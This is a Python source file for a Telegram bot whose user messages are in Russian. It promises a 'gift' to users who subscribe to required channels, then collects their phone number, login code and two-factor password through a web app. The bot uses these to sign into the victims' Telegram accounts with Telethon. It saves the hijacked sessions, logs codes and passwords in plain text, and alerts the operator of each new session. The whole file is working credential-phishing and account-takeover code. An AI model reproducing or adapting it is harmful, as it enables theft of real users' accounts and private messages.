import logging
import json
import sqlite3
import os
import random
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, FloodWaitError

# ============ CONFIG ============
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
ADMIN_ID = 123456789
REQUIRED_CHANNELS = ["@channel1", "@channel2", "@channel3"]
API_ID = 12345
API_HASH = "your_api_hash_here"
WEBAPP_URL = "https://ngbro777-gif.github.io/asdfghwr/"

# ============ LOGGING ============
logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ============ DATABASE ============
def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, 
                  country TEXT, 
                  phone TEXT, 
                  step TEXT)''')
    conn.commit()
    conn.close()

def log_attempt(user_id, phone, country, code=None, password=None):
    with open('logs.txt', 'a', encoding='utf-8') as f:
        f.write(f"{datetime.now()} | User:{user_id} | Country:{country} | Phone:{phone} | Code:{code} | Pass:{password}\n")

# ============ AUTH MANAGER ============
class AuthManager:
    def __init__(self):
        self.sessions = {}
        self.proxies = self.load_proxies()
        self.proxy_index = 0
    
    def load_proxies(self):
        proxies = []
        try:
            if os.path.exists('proxies.txt'):
                with open('proxies.txt', 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            parts = line.split(':')
                            if len(parts) >= 2:
                                proxies.append({
                                    'addr': parts[0],
                                    'port': int(parts[1])
                                })
        except:
            pass
        return proxies
    
    async def start_auth(self, user_id, phone, country):
        try:
            phone = phone.replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
            
            country_code = {
                'Россия': 'RU', 'Украина': 'UA', 'Казахстан': 'KZ',
                'Беларусь': 'BY', 'Узбекистан': 'UZ', 'Другое': 'OT'
            }.get(country, 'OT')
            
            os.makedirs('sessions', exist_ok=True)
            session_name = f"sessions/{country_code}_{phone.replace('+', '')}"
            
            client = TelegramClient(session_name, API_ID, API_HASH)
            await client.connect()
            
            if not await client.is_user_authorized():
                await client.send_code_request(phone)
                self.sessions[user_id] = {
                    'client': client,
                    'phone': phone,
                    'country': country
                }
                return {'status': 'code_sent'}
            else:
                await client.disconnect()
                return {'status': 'error', 'message': 'Уже авторизован'}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    async def submit_code(self, user_id, code):
        if user_id not in self.sessions:
            return {'status': 'error', 'message': 'Сессия не найдена'}
        
        session = self.sessions[user_id]
        try:
            await session['client'].sign_in(session['phone'], code)
            log_attempt(user_id, session['phone'], session['country'], code=code)
            return {'status': 'success', 'phone': session['phone'], 'country': session['country']}
        except SessionPasswordNeededError:
            return {'status': 'password_needed'}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}
    
    async def submit_password(self, user_id, password):
        if user_id not in self.sessions:
            return {'status': 'error', 'message': 'Сессия не найдена'}
        
        session = self.sessions[user_id]
        try:
            await session['client'].sign_in(password=password)
            log_attempt(user_id, session['phone'], session['country'], password=password)
            return {'status': 'success', 'phone': session['phone'], 'country': session['country']}
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

auth_manager = AuthManager()

# ============ BOT HANDLERS ============
@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    user_id = message.from_user.id
    
    not_subscribed = []
    for channel in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(channel, user_id)
            if member.status == 'left':
                not_subscribed.append(channel)
        except:
            not_subscribed.append(channel)
    
    if not_subscribed:
        channels_text = "\n".join([f"- {ch}" for ch in not_subscribed])
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Проверить подписку", callback_data="check_subs")]
        ])
        await message.answer(
            f"🎁 Чтобы получить подарок, подпишись на каналы:\n{channels_text}",
            reply_markup=keyboard
        )
    else:
        await send_webapp(message)

async def send_webapp(message: types.Message):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Получить подарок", web_app=WebAppInfo(url=WEBAPP_URL))]
    ])
    await message.answer("✅ Доступ открыт! Нажми кнопку:", reply_markup=keyboard)

@dp.callback_query(lambda c: c.data == "check_subs")
async def check_subs(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    not_subscribed = []
    
    for channel in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(channel, user_id)
            if member.status == 'left':
                not_subscribed.append(channel)
        except:
            not_subscribed.append(channel)
    
    if not_subscribed:
        await callback.answer("❌ Не все каналы!", show_alert=True)
    else:
        await callback.message.delete()
        await send_webapp(callback.message)

@dp.message(lambda msg: msg.web_app_data)
async def web_app_handler(message: types.Message):
    try:
        data = json.loads(message.web_app_data.data)
        user_id = message.from_user.id
        action = data.get('action')
        
        if action == 'start_auth':
            result = await auth_manager.start_auth(user_id, data.get('phone'), data.get('country'))
            if result['status'] == 'code_sent':
                await message.answer("✅ Код отправлен! Введи его")
            else:
                await message.answer(f"❌ Ошибка: {result['message']}")
                
        elif action == 'submit_code':
            result = await auth_manager.submit_code(user_id, data.get('code'))
            if result['status'] == 'success':
                await message.answer("✅ Готово!")
            elif result['status'] == 'password_needed':
                await message.answer("🔐 Введи пароль 2FA")
            else:
                await message.answer(f"❌ {result['message']}")
                
        elif action == 'submit_password':
            result = await auth_manager.submit_password(user_id, data.get('password'))
            if result['status'] == 'success':
                await message.answer("✅ Готово!")
                await bot.send_message(ADMIN_ID, f"✅ Новая сессия: {result['phone']}")
            else:
                await message.answer(f"❌ {result['message']}")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {str(e)}")

# ============ MAIN ============
async def main():
    init_db()
    os.makedirs('sessions', exist_ok=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())